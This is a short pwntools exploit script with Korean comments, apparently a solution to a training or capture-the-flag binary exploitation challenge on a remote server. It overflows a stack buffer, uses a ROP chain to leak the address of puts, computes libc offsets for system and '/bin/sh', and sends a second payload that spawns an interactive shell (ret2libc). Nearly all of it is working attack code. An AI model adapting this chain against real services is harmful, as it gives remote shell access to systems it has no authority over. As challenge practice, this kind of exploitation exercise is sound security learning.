
from pwn import *
context.terminal=['tmux', 'splitw', '-h']

#p = process("./prob2")
p = remote("fsi.zzado.kr", 9936)
e = ELF("./03 Pwn/prob6")
lib = ELF('./03 Pwn/libc.so.6')

r = ROP(e)
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = r.find_gadget(['ret'])[0]

puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.symbols['main']
#log.info(hex(puts_GOT))

# PLT는 런타임시 GOT로 점프하기 위한 주소라서 system이 소스코드 내부에 없으면
# 2번 문제처럼 e.plt['system'] 해도 못찾는다.
# 그래서 실제 GOT의 system이 필요하다.
# puts의 실제 GOT를 구하고 제공된 libc 파일 기준으로 offset을 동일하게 더해서 
# system함수의 GOT를 알아낸다. 
p.recv()
# puts의 GOT를 구함
payload =  b'a' * 0x20
payload += b'b' * 0x8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)
p.send(payload)


## Leak libc
p.recvuntil(b'\n')
leak_data = u64(p.recv()[:6] + b"\x00\x00") # 현재 실행중인 프로세스의 puts()의 GOT 주소를 알아냄
# 원본 라이브러리 puts()의 GOT 주소를 빼면 현재 프로세스 GOT의 시작 주소를 알 수 있음

# puts  	80E50	
# system	50D70	
# /bin/sh   1D8678
# puts와 system의 차이 : 0x300E0
# puts와 /bin/sh의 차이 : 0x157828

system = leak_data - 0x300E0
binsh = leak_data + 0x157828

## system("/bin/bash")
payload =  b'a' * 0x20
payload += b'b' * 0x8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret_gadget) # stack alignment
payload += p64(system)
p.send(payload)

p.interactive() 